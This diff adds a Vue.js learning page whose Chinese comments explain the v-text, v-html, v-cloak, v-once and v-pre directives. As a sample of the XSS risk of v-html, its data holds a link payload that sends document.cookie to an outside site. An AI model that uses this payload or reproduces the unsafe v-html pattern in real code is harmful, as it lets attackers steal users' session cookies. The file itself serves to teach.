@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        [v-cloak]{
+            display: none
+        }
+    </style>
+</head>
+<body>
+    <script src="./vue.js"></script>
+    <div id='root'>
+          <!-- v-text 将里面内容全部去掉 -->
+          <div v-text='msg'> 231</div>
+           <!-- v-html 和上面类型。但可能会造成xss -->
+          <div v-html='str'> 231</div>
+           <!-- v-cloak属性在vue加载后去掉，可以怕vue加载慢的影响 -->
+          <div v-cloak>123</div>
+
+          <!-- v-once值解析一次，后续不解析 -->
+          <div> n的值 : {{ n }}</div>
+          <div v-once> n的值 : {{ n }}</div>
+          <!-- v-pre不进行模板解析，一般也不用加 -->
+          <div v-pre> n的值 : {{ n }}</div>
+          <button @click='n=n+1'>那妞+1</button>
+    </div>
+    <script>
+        new Vue({
+            el:'#root',
+            data: {
+                msg: 'hello vue!',
+                // 可能造成泄漏
+                str: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>好的资源</a>',
+                n : 1
+            }
+        })
+    </script>
+</body>
+</html>
